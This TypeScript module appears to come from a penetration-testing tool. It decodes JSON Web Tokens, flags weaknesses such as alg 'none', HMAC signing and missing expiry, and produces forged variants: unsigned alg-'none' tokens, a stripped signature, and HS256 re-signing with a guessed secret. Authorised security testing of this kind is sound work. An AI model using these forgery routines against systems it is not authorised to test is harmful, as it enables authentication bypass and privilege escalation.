/**
 * A JWT workbench: decode a token, say what is weak about it, and produce the tampered
 * variants worth trying against the server.
 *
 * Everything here is analysis, not a verdict. A token whose `alg` is `none` is only a
 * *possible* forgery vector until the server accepts a forged one — so this module hands
 * you the forged token to send from the Repeater, and never claims the endpoint is
 * vulnerable on its own. That is the same evidence-before-claim rule the rest of the
 * engine follows.
 */

export interface JwtParts {
  header: Record<string, unknown>;
  payload: Record<string, unknown>;
  signature: string;
  /** The three raw base64url segments as they appeared. */
  raw: [string, string, string];
}

export interface JwtWeakness {
  severity: "high" | "medium" | "low";
  title: string;
  detail: string;
}

export interface JwtVariant {
  name: string;
  token: string;
  note: string;
}

// ---- base64url ----

function b64urlDecode(input: string): string {
  const pad = input.length % 4 === 0 ? "" : "=".repeat(4 - (input.length % 4));
  const b64 = input.replace(/-/g, "+").replace(/_/g, "/") + pad;
  const bin = atob(b64);
  // Decode UTF-8 bytes so multibyte claims survive.
  const bytes = Uint8Array.from(bin, (c) => c.charCodeAt(0));
  return new TextDecoder().decode(bytes);
}

function b64urlEncode(input: string): string {
  const bytes = new TextEncoder().encode(input);
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

function b64urlEncodeBytes(bytes: ArrayBuffer): string {
  const view = new Uint8Array(bytes);
  let bin = "";
  for (const b of view) bin += String.fromCharCode(b);
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

/** Parse a compact JWT, or throw with a readable reason. */
export function parseJwt(token: string): JwtParts {
  const t = token.trim();
  const segs = t.split(".");
  if (segs.length < 2 || segs.length > 3) {
    throw new Error("A JWT has two or three dot-separated segments.");
  }
  const [h, p, s = ""] = segs as [string, string, string?];
  let header: unknown;
  let payload: unknown;
  try {
    header = JSON.parse(b64urlDecode(h));
  } catch {
    throw new Error("Header is not valid base64url JSON.");
  }
  try {
    payload = JSON.parse(b64urlDecode(p));
  } catch {
    throw new Error("Payload is not valid base64url JSON.");
  }
  return {
    header: header as Record<string, unknown>,
    payload: payload as Record<string, unknown>,
    signature: s,
    raw: [h, p, s ?? ""],
  };
}

/** What is worth noticing about this token before you try to forge one. */
export function analyzeJwt(parts: JwtParts): JwtWeakness[] {
  const out: JwtWeakness[] = [];
  const alg = String(parts.header["alg"] ?? "");

  if (/^none$/i.test(alg)) {
    out.push({
      severity: "high",
      title: "Unsigned token (alg: none)",
      detail:
        "The token declares no signature algorithm. If the server honours it, any claim can be forged. Send the none-alg variant and check the server still accepts it.",
    });
  }
  if (/^hs/i.test(alg)) {
    out.push({
      severity: "medium",
      title: `Symmetric signature (${alg})`,
      detail:
        "HMAC signatures are only as strong as the secret. If the secret is guessable, the token can be re-signed. Try the HS256 re-sign with a wordlist secret.",
    });
  }
  if (parts.signature === "") {
    out.push({
      severity: "medium",
      title: "No signature segment",
      detail: "The token carries no signature at all — treat any trust placed in it as unverified.",
    });
  }

  const now = Math.floor(Date.now() / 1000);
  const exp = parts.payload["exp"];
  if (exp === undefined) {
    out.push({
      severity: "low",
      title: "No expiry (exp)",
      detail: "The token never expires on its own; a leaked one is valid indefinitely.",
    });
  } else if (typeof exp === "number" && exp < now) {
    out.push({
      severity: "low",
      title: "Expired",
      detail: `exp is ${new Date(exp * 1000).toISOString()} — already past. A server that still accepts it is not checking expiry.`,
    });
  }

  // Claims that make forgery interesting.
  const flagged = ["role", "roles", "admin", "is_admin", "isAdmin", "scope", "scopes", "groups", "user_id", "uid", "sub"];
  const present = flagged.filter((k) => k in parts.payload);
  if (present.length > 0) {
    out.push({
      severity: "low",
      title: "Authorization claims present",
      detail: `Claims a forged token could target: ${present.join(", ")}.`,
    });
  }
  return out;
}

function encodePart(obj: Record<string, unknown>): string {
  return b64urlEncode(JSON.stringify(obj));
}

/**
 * Tampered tokens worth sending. Each keeps the original payload (so the session still
 * identifies the same subject) unless the caller overrides it, and changes only what an
 * attack turns on.
 */
export function attackVariants(parts: JwtParts, payloadOverride?: Record<string, unknown>): JwtVariant[] {
  const payload = payloadOverride ?? parts.payload;
  const pEnc = encodePart(payload);
  const variants: JwtVariant[] = [];

  for (const algName of ["none", "None", "nOnE"]) {
    const hEnc = encodePart({ ...parts.header, alg: algName });
    variants.push({
      name: `alg: ${algName}`,
      token: `${hEnc}.${pEnc}.`,
      note: "Unsigned. Accepted only by a server that trusts the header's alg.",
    });
  }

  variants.push({
    name: "signature stripped",
    token: `${encodePart(parts.header)}.${pEnc}.`,
    note: "Original header, empty signature. Some libraries skip verification when the signature is blank.",
  });

  return variants;
}

/** Re-sign header+payload with HS256 under a guessed secret. Uses Web Crypto. */
export async function signHs256(
  header: Record<string, unknown>,
  payload: Record<string, unknown>,
  secret: string,
): Promise<string> {
  const h = encodePart({ ...header, alg: "HS256", typ: header["typ"] ?? "JWT" });
  const p = encodePart(payload);
  const data = `${h}.${p}`;
  const key = await crypto.subtle.importKey(
    "raw",
    new TextEncoder().encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sig = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(data));
  return `${data}.${b64urlEncodeBytes(sig)}`;
}
